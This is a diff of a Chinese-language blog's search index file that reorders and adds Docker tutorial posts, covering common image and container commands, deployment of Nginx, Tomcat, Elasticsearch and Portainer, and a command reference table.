@@ -261,31 +261,6 @@
       </tags>
   </entry>
   <entry>
-    <title>Docker相关部署</title>
-    <url>/2023/07/31/Docker2/</url>
-    <content><![CDATA[<h1 id=""><a href="#" class="headerlink" title=""></a></h1><span id="more"></span>
-
-<h1 id="Docker安装Nginx"><a href="#Docker安装Nginx" class="headerlink" title="Docker安装Nginx"></a>Docker安装Nginx</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.搜索镜像 docker search nginx</span><br><span class="line">2.下载镜像 docker pull nginx</span><br><span class="line">3.运行测试</span><br><span class="line">[root@163 ~]# docker images</span><br><span class="line">REPOSITORY    TAG       IMAGE ID       CREATED         SIZE</span><br><span class="line">nginx         latest    605c77e624dd   19 months ago   141MB</span><br><span class="line">centos        latest    5d0da3dc9764   22 months ago   231MB</span><br><span class="line">-d 后台运行（停止了容器后，容器还可以查到）</span><br><span class="line">--name 给容器命名</span><br><span class="line">-p 宿主机:容器内部端口</span><br><span class="line">[root@163 ~]# docker run -d --name nginx01 -p 3344:80 nginx</span><br><span class="line">bb07f6e55670b129a14434aae3a9422cf3f7091f2d3079a5f96005613a909993</span><br><span class="line">[root@163 ~]# docker ps</span><br><span class="line">CONTAINER ID   IMAGE     COMMAND                  CREATED         STATUS         PORTS                                   NAMES</span><br><span class="line">bb07f6e55670   nginx     &quot;/docker-entrypoint.…&quot;   9 seconds ago   Up 8 seconds   0.0.0.0:3344-&gt;80/tcp, :::3344-&gt;80/tcp   nginx01</span><br><span class="line">[root@163 ~]# curl localhost:3344</span><br><span class="line"></span><br><span class="line">4.进入容器</span><br><span class="line">[root@163 ~]# docker exec -it nginx01 /bin/bash</span><br><span class="line">root@bb07f6e55670:/# whereis nginx</span><br><span class="line">nginx: /usr/sbin/nginx /usr/lib/nginx /etc/nginx /usr/share/nginx</span><br><span class="line">root@bb07f6e55670:/# cd /etc/nginx</span><br><span class="line">root@bb07f6e55670:/etc/nginx# ls</span><br><span class="line">conf.d		mime.types  nginx.conf	 uwsgi_params</span><br><span class="line">fastcgi_params	modules     scgi_params</span><br><span class="line">root@bb07f6e55670:/etc/nginx# </span><br></pre></td></tr></table></figure>
-
-<h1 id="Docker安装Tomcat"><a href="#Docker安装Tomcat" class="headerlink" title="Docker安装Tomcat"></a>Docker安装Tomcat</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#官方使用</span><br><span class="line">docker run -it --rm tomcat:9.0</span><br><span class="line">docker run -it --rm一般用于测试，用完立即删除</span><br><span class="line"></span><br><span class="line">#下载再使用</span><br><span class="line">docker pull tomcat:9.0</span><br><span class="line"></span><br><span class="line">#启动运行</span><br><span class="line">docker run -d -p 3355:8080 --name tomcat01 tomcat</span><br><span class="line">#测试访问没有问题</span><br><span class="line"></span><br><span class="line">#进入容器</span><br><span class="line">[root@163 ~]# docker exec -it tomcat01 /bin/bash</span><br><span class="line">#发现问题，1.1inux命今少了，2.没有webapps 阿里云镜像的原因。默认是最小的镜像，所有不必要的都被剔除掉。保证最小可运行的环境</span><br></pre></td></tr></table></figure>
-
-<h1 id="部署es-kibana"><a href="#部署es-kibana" class="headerlink" title="部署es+kibana"></a>部署es+kibana</h1><figure class="highlight console"><table><tr><td class="code"><pre><span class="line">--net somenetwork  网络配置</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">启动</span></span><br><span class="line">docker run -d --name elasticsearch (--net somenetwork) -p 9200:9200 -p 9300:9300 -e &quot;discovery.type=single-node&quot; elasticsearch:8.8.1</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">启动了 1inux就卡住了</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">es 暴露的端口很多!</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">es 十分的耗内存</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">es 的数据一般霉要放置到安全目录!挂载</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">docker stats 查看 cpu的状态</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">测试一下es构建是否成功</span></span><br><span class="line">    curl localhost:9200</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">马上关闭，增加内存限制 修改配置文件 -e 环境配置修改</span></span><br><span class="line">docker run -d --name elasticsearch -p 9200:9200 -p 9300:9300 -e &quot;discovery.type=single-node&quot; -e ES_JAVA_OPTS=&quot;-Xms64m -Xmx512m&quot; elasticsearch:8.8.1</span><br></pre></td></tr></table></figure>
-
-<h1 id="安装vim"><a href="#安装vim" class="headerlink" title="安装vim"></a>安装vim</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apt-get install vim</span><br></pre></td></tr></table></figure>
-
-<h1 id="安装php和php插件"><a href="#安装php和php插件" class="headerlink" title="安装php和php插件"></a>安装php和php插件</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apt-get install php -y</span><br><span class="line">apt-get install libapache2-mod-php -y  --fix-missing</span><br><span class="line">apt-get install php7.0-mysql</span><br></pre></td></tr></table></figure>
-
-<h1 id="可视化"><a href="#可视化" class="headerlink" title="可视化"></a>可视化</h1><p><strong>什么 portainer ?</strong><br>Docker图形化界面管理工具!提供一个后台面板供我们操作 !</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker run -d -p 8088:9000 --restart=always -v /var/run/docker.sock:/var/run/docker.sock --privileged=true portainer/portainer</span><br></pre></td></tr></table></figure>
-
-<p>访问测试：端口打开8088  访问<a href="http://ip:8088/">http://ip:8088/</a></p>
-<h1 id="commit镜像"><a href="#commit镜像" class="headerlink" title="commit镜像"></a>commit镜像</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker commit 提交容器成为一个新的副本</span><br><span class="line"></span><br><span class="line">#命今和git原理类似</span><br><span class="line">docker commit -m=&quot;提交的描述信息”-a=&quot;作者”容器id 目标镜像名:[TAG]</span><br><span class="line"></span><br><span class="line">实战测试</span><br><span class="line"># 1、启动一个默认的tomcat</span><br><span class="line"># 2、发现这个默认的tomcat 是没有webapps应用，镜像的原因，官方的镜像默认 webapps下面是没有文件的!</span><br><span class="line"># 3、我自己拷贝进去了基本的文件</span><br><span class="line"># 4、将我们操作过的容器通过commit提交为一个境像! 我们以后就使用我们修改过的镜像即可，这就是我们自己的一个修改的镜像</span><br></pre></td></tr></table></figure>
-]]></content>
-      <tags>
-        <tag>Docker</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>docker</title>
     <url>/2023/07/30/Docker/</url>
     <content><![CDATA[<h1 id=""><a href="#" class="headerlink" title=""></a></h1><span id="more"></span>
@@ -390,6 +365,270 @@
 <h1 id="底层原理"><a href="#底层原理" class="headerlink" title="底层原理"></a>底层原理</h1><p><strong>Docker是什么工作的?</strong><br>Docker 是一个Client-Server 结构的系统，Docker的守护进程运行在主机上。通过Socket从客户端访问<br>DockerServer 接收到 Docker-Client 的指令，就会执行这个命令</p>
 <p><strong>Docker为什么比VM快</strong><br>1、Docker有着比虚拟机更少的抽象层<br>2、docker 利用的是宿主机的内核，vm 需要是 Guest OS。<br><img src="https://img-blog.csdnimg.cn/9b835a379a044e06869c036190e649aa.png" alt="在这里插入图片描述"><br>所以说，新建一个容器的时候，docker不需要想虚拟机一样重新加载一个操作系统内核，避免引导。虚拟机是加载 Guest OS，分钟级别的，而docker 是利用 宿主机的操作系统吗，省略了这个复杂的过程，秒级!</p>
 <p><img src="https://img-blog.csdnimg.cn/2725bac4251243ce9e42eff23e2e44ac.png" alt="在这里插入图片描述"></p>
+]]></content>
+      <tags>
+        <tag>Docker</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Docker命令</title>
+    <url>/2023/07/31/Docker%E5%91%BD%E4%BB%A4/</url>
+    <content><![CDATA[<h1 id="Docker的常用命令"><a href="#Docker的常用命令" class="headerlink" title="Docker的常用命令"></a>Docker的常用命令</h1><span id="more"></span>
+
+<h2 id="帮助命令"><a href="#帮助命令" class="headerlink" title="帮助命令"></a>帮助命令</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker version      #显示docker的版本信息</span><br><span class="line">docker info            #显示docker的系统信息，包括境像和容器的数量</span><br><span class="line">docker 命令 --help# 帮助命令</span><br><span class="line"></span><br><span class="line">帮助文档的地址：https://docs.docker.com/engine/reference/commandline</span><br></pre></td></tr></table></figure>
+
+<h2 id="镜像命令"><a href="#镜像命令" class="headerlink" title="镜像命令"></a>镜像命令</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker images 查看所有本地的主机上的镜像</span><br><span class="line">[root@xxx /]# docker images</span><br><span class="line">REPOSITORY			TAG	    	IMAGE ID		      CREATED	         	SIZE</span><br><span class="line">he11o-world			Tatest		bf756fblae65		4 months ago		13.3kB</span><br><span class="line"></span><br><span class="line">解释</span><br><span class="line">REPOSITORY    镜像的仓库源</span><br><span class="line">TAG		      	 镜像的标签</span><br><span class="line">IMAGE ID		  镜像的id</span><br><span class="line">CREATED		  镜像的创建时间</span><br><span class="line">SIZE					镜像的大小</span><br><span class="line"></span><br><span class="line">#可选项</span><br><span class="line">-a，--all						   列出所有镜像</span><br><span class="line">-q，--quiet  				    只显示ID</span><br></pre></td></tr></table></figure>
+
+<h3 id="docker-search-搜索镜像"><a href="#docker-search-搜索镜像" class="headerlink" title="docker search 搜索镜像"></a>docker search 搜索镜像</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@xxx /]# docker search mysql</span><br><span class="line">NAME                            DESCRIPTION                                                    STARS     OFFICIAL   AUTOMATED</span><br><span class="line">mysql                 MySQL is a widely used, open-source relation…    14338        [OK]       </span><br><span class="line">mariadb             MariaDB Server is a high performing open sou…   5474         [OK]       </span><br><span class="line"></span><br><span class="line">#可选项，通过搜藏来过滤</span><br><span class="line">--filter=STARS=3000# 搜索出来的镜像就是STARS大于3000的</span><br><span class="line"></span><br><span class="line">[root@xxx ~]# docker search mysql --filter=STARS=3000</span><br><span class="line">NAME        					 DESCRIPTION                              			  STARS     OFFICIAL   AUTOMATED</span><br><span class="line">mysql     MySQL is a widely used, open-source relation…   	14338     [OK]       </span><br><span class="line">mariadb   MariaDB Server is a high performing open sou…    5474      [OK]       </span><br></pre></td></tr></table></figure>
+
+<h3 id="拉取镜像docker-pull-镜像名-tag"><a href="#拉取镜像docker-pull-镜像名-tag" class="headerlink" title="拉取镜像docker pull 镜像名[:tag]"></a><strong>拉取镜像docker pull 镜像名[:tag]</strong></h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@163 ~]# docker pull mysql</span><br><span class="line">Using default tag: latest  #如果不写tag，默认最新版本</span><br><span class="line">latest: Pulling from library/mysql</span><br><span class="line">72a69066d2fe: Pull complete 		#分层下载，docker  image的核心  联合文件系统</span><br><span class="line">93619dbc5b36: Pull complete </span><br><span class="line">99da31dd6142: Pull complete </span><br><span class="line">626033c43d70: Pull complete </span><br><span class="line">37d5d7efb64e: Pull complete </span><br><span class="line">ac563158d721: Pull complete </span><br><span class="line">d2ba16033dad: Pull complete </span><br><span class="line">688ba7d5c01a: Pull complete </span><br><span class="line">00e060b6d11d: Pull complete </span><br><span class="line">1c04857f594f: Pull complete </span><br><span class="line">4d7cfa90e6ea: Pull complete </span><br><span class="line">e0431212d27d: Pull complete </span><br><span class="line">Digest: sha256:e9027fe4d91c0153429607251656806cc784e914937271037f7738bd5b8e7709  #签名</span><br><span class="line">Status: Downloaded newer image for mysql:latest</span><br><span class="line">docker.io/library/mysql:latest	#真实地址</span><br><span class="line"></span><br><span class="line">*docker pull mysql等价于docker pull docker.io/library/mysql:latest</span><br><span class="line"></span><br><span class="line">*docker pull mysql:5.7</span><br><span class="line">[root@163 ~]# docker pull mysql:5.7</span><br><span class="line">5.7: Pulling from library/mysql</span><br><span class="line">72a69066d2fe: Already exists </span><br><span class="line">93619dbc5b36: Already exists </span><br><span class="line">99da31dd6142: Already exists </span><br><span class="line">626033c43d70: Already exists </span><br><span class="line">37d5d7efb64e: Already exists </span><br><span class="line">ac563158d721: Already exists </span><br><span class="line">d2ba16033dad: Already exists //以上为重复部分</span><br><span class="line">0ceb82207cd7: Pull complete </span><br><span class="line">37f2405cae96: Pull complete </span><br><span class="line">e2482e017e53: Pull complete </span><br><span class="line">70deed891d42: Pull complete </span><br><span class="line">Digest: sha256:f2ad209efe9c67104167fc609cca6973c8422939491c9345270175a300419f94</span><br><span class="line">Status: Downloaded newer image for mysql:5.7</span><br><span class="line">docker.io/library/mysql:5.7</span><br></pre></td></tr></table></figure>
+
+<h3 id="删除镜像docker-rmi"><a href="#删除镜像docker-rmi" class="headerlink" title="删除镜像docker rmi"></a>删除镜像docker rmi</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker rmi -f   镜像ID			 //删除指定镜像</span><br><span class="line"></span><br><span class="line">docker rmi -f   镜像ID 镜像ID 镜像ID //删除多个镜像</span><br><span class="line"></span><br><span class="line">docker rmi -f  $(docker images -aq)	  //删除所有镜像</span><br></pre></td></tr></table></figure>
+
+<h2 id="容器命令"><a href="#容器命令" class="headerlink" title="容器命令"></a>容器命令</h2><p><strong>说明:我们有了镜像才可以创建容器，linux，下载一个 centos 镜像来测试学习</strong><br>docker pull centos</p>
+<h3 id="新建容器并启动"><a href="#新建容器并启动" class="headerlink" title="新建容器并启动"></a>新建容器并启动</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker run [可选参数] image</span><br><span class="line"></span><br><span class="line">#参数说明</span><br><span class="line">--name=&quot;Name&quot;		   容器名字 tomcat01 tomcat02，用来区分容器</span><br><span class="line">-d									后台方式运行</span><br><span class="line">-it									使用交互方式运行，进入容器查看内容</span><br><span class="line"></span><br><span class="line">-p								   指定容器的端口-p  8080:8080</span><br><span class="line"></span><br><span class="line">     	 	-p ip:主机端口:容器端口</span><br><span class="line">			-p 主机端口:容器端口 (常用)</span><br><span class="line">			-p 容器端口</span><br><span class="line">			容器端口</span><br><span class="line"></span><br><span class="line">-P								   随机指定端口</span><br><span class="line"></span><br><span class="line">#测试，启动并进入容器</span><br><span class="line"></span><br><span class="line">[root@xxx ~]# docker run -it centos /bin/bash</span><br><span class="line"></span><br><span class="line">[root@c0eed8b69c30 /]# ls   //查看容器内的centos,基础版本，很多命令都不完善</span><br><span class="line">bin  etc   lib	  lost+found  mnt  proc  run   srv  tmp  var	</span><br><span class="line">dev  home  lib64  media       opt  root  sbin  sys  usr</span><br><span class="line"></span><br><span class="line">exit		//从容器中退回主机</span><br></pre></td></tr></table></figure>
+
+<h3 id="列出所有运行的容器"><a href="#列出所有运行的容器" class="headerlink" title="列出所有运行的容器"></a>列出所有运行的容器</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#docker ps 命令</span><br><span class="line">     	列出当前正在运行的容器</span><br><span class="line"></span><br><span class="line">-a 		//列出当前正在运行的容器+带出历史运行过的容器</span><br><span class="line">-n=? 	// 显示最近创建的容器</span><br><span class="line">-q		//只显示容器的编号</span><br></pre></td></tr></table></figure>
+
+<h3 id="退出容器"><a href="#退出容器" class="headerlink" title="退出容器"></a>退出容器</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">exit 				   //直接容器停止并退出  </span><br><span class="line"></span><br><span class="line">Ctrl + P + Q 	//容不停止退出</span><br></pre></td></tr></table></figure>
+
+<h3 id="删除容器"><a href="#删除容器" class="headerlink" title="删除容器"></a>删除容器</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker rm 容器id		//删除指定的容器，不能除正在运行的容器，如果要强制刚除 rm -f</span><br><span class="line">docker rm -f $(docker ps -aq)		//删除所有的容器</span><br><span class="line">docker ps -a -q|xargs docker rm 		// 删除所有的容器</span><br></pre></td></tr></table></figure>
+
+<h3 id="启动和停止容器的操作"><a href="#启动和停止容器的操作" class="headerlink" title="启动和停止容器的操作"></a>启动和停止容器的操作</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker start 容器id			启动容器</span><br><span class="line">docker restart 容器id		重启容器</span><br><span class="line">docker stop 容器id			停止当前正在运行的容器</span><br><span class="line">docker kill 容器id			  强制停止当前容器</span><br></pre></td></tr></table></figure>
+
+<h2 id="常用其他命令"><a href="#常用其他命令" class="headerlink" title="常用其他命令"></a>常用其他命令</h2><p><strong>后台启动容器</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#命令 docker run -d 镜像名!</span><br><span class="line"></span><br><span class="line">[root@xxx /]# docker run -d centos</span><br><span class="line"></span><br><span class="line">#问题docker ps，发现 centos 停止了</span><br><span class="line"></span><br><span class="line">#常见的坑:docker 容器使用后台运行，就必须要有要一个前台进程，docker发现没有应用，就会自动停止</span><br><span class="line"></span><br><span class="line">#nginx，容器启动后，发现自己没有提供服务，就会立刻停止，就是没有程序了</span><br></pre></td></tr></table></figure>
+
+<p><strong>查看日志</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker logs -f -t --tail 容器，没有日志</span><br><span class="line"></span><br><span class="line">#自己编写一段shell脚本</span><br><span class="line"></span><br><span class="line">[root@xxx /]# docker run -d centos /bin/sh -c &quot;while true;do echo hhhhhh;sleep 1;done&quot;</span><br><span class="line"></span><br><span class="line">[root@xxx /]# docker ps</span><br><span class="line"></span><br><span class="line">CONTAINER ID			IMAGE</span><br><span class="line">dce7b86171bf			centos</span><br><span class="line"></span><br><span class="line">#显示日志</span><br><span class="line"></span><br><span class="line">-tf								//显示日志</span><br><span class="line"></span><br><span class="line">--tai1 number			//要显示日志条数</span><br><span class="line"></span><br><span class="line">[root@xxx /]# docker logs -tf --tai1 10 dce7b86171bf</span><br></pre></td></tr></table></figure>
+
+<p><strong>查看容器中进程信息</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#docker ps</span><br><span class="line">#命令docker top 容器id</span><br><span class="line">UID                 PID                 PPID        	    C                 STIME       </span><br><span class="line">root                1432624             1432594             0                   20:14     </span><br><span class="line">root                1452486             1432624             0                   20:20     </span><br></pre></td></tr></table></figure>
+
+<p><strong>查看镜像的元数据</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#命令 docker inspect 容器id</span><br></pre></td></tr></table></figure>
+
+<p><strong>进入当前正在运行的容器</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">方式一：docker exec -it 容器id /bin/bash		//进入容器后开启一个新的终端，可以在里面操作</span><br><span class="line"></span><br><span class="line">方式二：docker attach 容器id		 				 //进入容器正在执行的终端，不会启动新的进程</span><br></pre></td></tr></table></figure>
+
+<p><strong>从容器内拷贝文件到主机上</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker  cp 容器id:容器内路径  目的的主机路径</span><br><span class="line"></span><br><span class="line">#查看当将主机目录下</span><br><span class="line"></span><br><span class="line">[root@163 home]# ls</span><br><span class="line">hhh.java  redis  www</span><br><span class="line">[root@163 home]#  docker ps</span><br><span class="line">CONTAINER ID   IMAGE     COMMAND       CREATED         STATUS         PORTS     NAMES</span><br><span class="line">69687a39e545   centos    &quot;/bin/bash&quot;   2 minutes ago   Up 2 minutes             vigilant_blackburn</span><br><span class="line"></span><br><span class="line">#进入docker容器内部</span><br><span class="line"></span><br><span class="line">[root@163 home]# docker attach 69687a39e545</span><br><span class="line">[root@69687a39e545 /]# cd /home</span><br><span class="line">[root@69687a39e545 home]# ls</span><br><span class="line"></span><br><span class="line">#在容器内新建一个文件</span><br><span class="line"></span><br><span class="line">[root@69687a39e545 home]# touch test.java</span><br><span class="line">[root@69687a39e545 home]# exit</span><br><span class="line">exit</span><br><span class="line">[root@163 home]# docker ps</span><br><span class="line">CONTAINER ID   IMAGE     COMMAND   CREATED   STATUS    PORTS     NAMES</span><br><span class="line">[root@163 home]# docker ps -a</span><br><span class="line">CONTAINER ID   IMAGE     COMMAND       CREATED         STATUS                      PORTS     NAMES</span><br><span class="line">69687a39e545   centos    &quot;/bin/bash&quot;   4 minutes ago   Exited (0) 31 seconds ago             vigilant_blackburn</span><br><span class="line"></span><br><span class="line">#将文件拷贝出来到主机上</span><br><span class="line"></span><br><span class="line">[root@163 home]# docker cp 69687a39e545:/home/test.java /home</span><br><span class="line">Successfully copied 1.54kB to /home</span><br><span class="line">[root@163 home]# ls</span><br><span class="line">hhh.java  redis  test.java  www</span><br><span class="line"></span><br><span class="line">#拷贝是一个手动过程，使用-v卷的技术可以实现</span><br></pre></td></tr></table></figure>
+
+<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p><img src="C:\Users\陈\AppData\Roaming\Typora\typora-user-images\image-20230730205339571.png" alt="image-20230730205339571"></p>
+<table>
+<thead>
+<tr>
+<th align="center">attach</th>
+<th align="center">Attach to a running container</th>
+<th align="center">当前 she11 下 attach 连接指定运行镜像</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">build</td>
+<td align="center">Build an imagerfrom a Dockerfile</td>
+<td align="center">通过 Dockerfile 定制镜像</td>
+</tr>
+<tr>
+<td align="center">commit</td>
+<td align="center">Create a new image from a container changes</td>
+<td align="center">提交当前容器为新的镜像</td>
+</tr>
+<tr>
+<td align="center">cp</td>
+<td align="center">Copy files&#x2F;folders from the containers filesystem to the host path</td>
+<td align="center">从容器中搏贝指定文件或者目录到宿主机中</td>
+</tr>
+<tr>
+<td align="center">create</td>
+<td align="center">Create a new container</td>
+<td align="center">创建一个新的容器，同 run，但不启动容器</td>
+</tr>
+<tr>
+<td align="center">diff</td>
+<td align="center">Inspect changes on a container’s fiesystem</td>
+<td align="center">查看 docker 容器变化</td>
+</tr>
+<tr>
+<td align="center">events</td>
+<td align="center">Get real time events from the server</td>
+<td align="center">从 docker 服务获取容器实时事件</td>
+</tr>
+<tr>
+<td align="center">exec</td>
+<td align="center">Run a command in an existing container</td>
+<td align="center">在已存在的容器上运行命令</td>
+</tr>
+<tr>
+<td align="center">export</td>
+<td align="center">Stream the contents of a container as a tar archive</td>
+<td align="center">导出容器的内容作为一个 tar 归档文件[对应import]</td>
+</tr>
+<tr>
+<td align="center">history</td>
+<td align="center">Show the history of an image</td>
+<td align="center">展示一个镜像形成历史</td>
+</tr>
+<tr>
+<td align="center">images</td>
+<td align="center">List images</td>
+<td align="center">列出系统当前镜像</td>
+</tr>
+<tr>
+<td align="center">import</td>
+<td align="center">Create a new filesystem image from the contents of a tarball</td>
+<td align="center">从tar包中的内容创建一个新的文件系统映像[对应export]</td>
+</tr>
+<tr>
+<td align="center">info</td>
+<td align="center">Display system-wide information</td>
+<td align="center">显示系统相关信息</td>
+</tr>
+<tr>
+<td align="center">inspect</td>
+<td align="center">Return low-Tevel information on a container</td>
+<td align="center">查看容器详细信息</td>
+</tr>
+<tr>
+<td align="center">kill</td>
+<td align="center">Kill a running container</td>
+<td align="center">kill 指定 docker 容器</td>
+</tr>
+<tr>
+<td align="center">load</td>
+<td align="center">Load an image from a tar archive</td>
+<td align="center">从一个 tar 包中加载一个像[对应 save]</td>
+</tr>
+<tr>
+<td align="center">login</td>
+<td align="center">Register or Login to the docker registry server</td>
+<td align="center">注册或者陆一个 docker 源服务器</td>
+</tr>
+<tr>
+<td align="center">logout</td>
+<td align="center">Log out from a Docker registry server</td>
+<td align="center">从当前 Docker registry 退出</td>
+</tr>
+<tr>
+<td align="center">logs</td>
+<td align="center">Fetch the logs of a container</td>
+<td align="center">输出当前容器日志信息</td>
+</tr>
+<tr>
+<td align="center">port</td>
+<td align="center">Lookup the public-facing port which is NAT-ed to PRIVATE_PORT</td>
+<td align="center">查看映射端口对应的容器内部源端口</td>
+</tr>
+<tr>
+<td align="center">pause</td>
+<td align="center">Pause all processes within a container</td>
+<td align="center">暂停容器</td>
+</tr>
+<tr>
+<td align="center">ps</td>
+<td align="center">List containers</td>
+<td align="center">列出容器列表</td>
+</tr>
+<tr>
+<td align="center">pull</td>
+<td align="center">Pull an image or a repository from the docker registry server</td>
+<td align="center">从docker镜像源服务器拉取指定镜像或者库镜像</td>
+</tr>
+<tr>
+<td align="center">push</td>
+<td align="center">Push an image or a repository to the docker registry server</td>
+<td align="center">推送指定镜像或者库镜像至docker源服务器</td>
+</tr>
+<tr>
+<td align="center">restart</td>
+<td align="center">Restart a running container</td>
+<td align="center">重启运行的容器</td>
+</tr>
+<tr>
+<td align="center">rm</td>
+<td align="center">Remove one or more containers</td>
+<td align="center">移除一个或者多个容器</td>
+</tr>
+<tr>
+<td align="center">rmi</td>
+<td align="center">Remove one or more images</td>
+<td align="center">移除一个或多个镜像[无容器使用该镜像才可删除，否则需删除相关容器才可继续或 -f 强制删除]</td>
+</tr>
+<tr>
+<td align="center">run</td>
+<td align="center">Run a command in a new container</td>
+<td align="center">创建一个新的容器并运行一个命令</td>
+</tr>
+<tr>
+<td align="center">save</td>
+<td align="center">Save an image to a tar archive</td>
+<td align="center">保存一个镜像为一个 tar 包[对应 load]</td>
+</tr>
+<tr>
+<td align="center">search</td>
+<td align="center">Search for an image on the Docker Hub</td>
+<td align="center">在 docker hub 中搜索镜像</td>
+</tr>
+<tr>
+<td align="center">start</td>
+<td align="center">Start a stopped containers</td>
+<td align="center">启动容器</td>
+</tr>
+<tr>
+<td align="center">stop</td>
+<td align="center">Stop a running containers</td>
+<td align="center">停止容器</td>
+</tr>
+<tr>
+<td align="center">tag</td>
+<td align="center">Tag an image into a repository</td>
+<td align="center">给源中镜像打标签</td>
+</tr>
+<tr>
+<td align="center">top</td>
+<td align="center">Lookup the running processes of a container</td>
+<td align="center">查看容器中运行的进程信息</td>
+</tr>
+<tr>
+<td align="center">unpause</td>
+<td align="center">Unpause a paused container</td>
+<td align="center">取消暂停容器</td>
+</tr>
+<tr>
+<td align="center">version</td>
+<td align="center">Show the docker version information</td>
+<td align="center">查看 docker 版本号</td>
+</tr>
+<tr>
+<td align="center">wait</td>
+<td align="center">Block until a container stops，then print its exit code</td>
+<td align="center">截取容器止时的退出状态值</td>
+</tr>
+</tbody></table>
+]]></content>
+      <tags>
+        <tag>Docker</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Docker相关部署</title>
+    <url>/2023/07/31/Docker2/</url>
+    <content><![CDATA[<h1 id=""><a href="#" class="headerlink" title=""></a></h1><span id="more"></span>
+
+<h1 id="Docker安装Nginx"><a href="#Docker安装Nginx" class="headerlink" title="Docker安装Nginx"></a>Docker安装Nginx</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.搜索镜像 docker search nginx</span><br><span class="line">2.下载镜像 docker pull nginx</span><br><span class="line">3.运行测试</span><br><span class="line">[root@163 ~]# docker images</span><br><span class="line">REPOSITORY    TAG       IMAGE ID       CREATED         SIZE</span><br><span class="line">nginx         latest    605c77e624dd   19 months ago   141MB</span><br><span class="line">centos        latest    5d0da3dc9764   22 months ago   231MB</span><br><span class="line">-d 后台运行（停止了容器后，容器还可以查到）</span><br><span class="line">--name 给容器命名</span><br><span class="line">-p 宿主机:容器内部端口</span><br><span class="line">[root@163 ~]# docker run -d --name nginx01 -p 3344:80 nginx</span><br><span class="line">bb07f6e55670b129a14434aae3a9422cf3f7091f2d3079a5f96005613a909993</span><br><span class="line">[root@163 ~]# docker ps</span><br><span class="line">CONTAINER ID   IMAGE     COMMAND                  CREATED         STATUS         PORTS                                   NAMES</span><br><span class="line">bb07f6e55670   nginx     &quot;/docker-entrypoint.…&quot;   9 seconds ago   Up 8 seconds   0.0.0.0:3344-&gt;80/tcp, :::3344-&gt;80/tcp   nginx01</span><br><span class="line">[root@163 ~]# curl localhost:3344</span><br><span class="line"></span><br><span class="line">4.进入容器</span><br><span class="line">[root@163 ~]# docker exec -it nginx01 /bin/bash</span><br><span class="line">root@bb07f6e55670:/# whereis nginx</span><br><span class="line">nginx: /usr/sbin/nginx /usr/lib/nginx /etc/nginx /usr/share/nginx</span><br><span class="line">root@bb07f6e55670:/# cd /etc/nginx</span><br><span class="line">root@bb07f6e55670:/etc/nginx# ls</span><br><span class="line">conf.d		mime.types  nginx.conf	 uwsgi_params</span><br><span class="line">fastcgi_params	modules     scgi_params</span><br><span class="line">root@bb07f6e55670:/etc/nginx# </span><br></pre></td></tr></table></figure>
+
+<h1 id="Docker安装Tomcat"><a href="#Docker安装Tomcat" class="headerlink" title="Docker安装Tomcat"></a>Docker安装Tomcat</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#官方使用</span><br><span class="line">docker run -it --rm tomcat:9.0</span><br><span class="line">docker run -it --rm一般用于测试，用完立即删除</span><br><span class="line"></span><br><span class="line">#下载再使用</span><br><span class="line">docker pull tomcat:9.0</span><br><span class="line"></span><br><span class="line">#启动运行</span><br><span class="line">docker run -d -p 3355:8080 --name tomcat01 tomcat</span><br><span class="line">#测试访问没有问题</span><br><span class="line"></span><br><span class="line">#进入容器</span><br><span class="line">[root@163 ~]# docker exec -it tomcat01 /bin/bash</span><br><span class="line">#发现问题，1.1inux命今少了，2.没有webapps 阿里云镜像的原因。默认是最小的镜像，所有不必要的都被剔除掉。保证最小可运行的环境</span><br></pre></td></tr></table></figure>
+
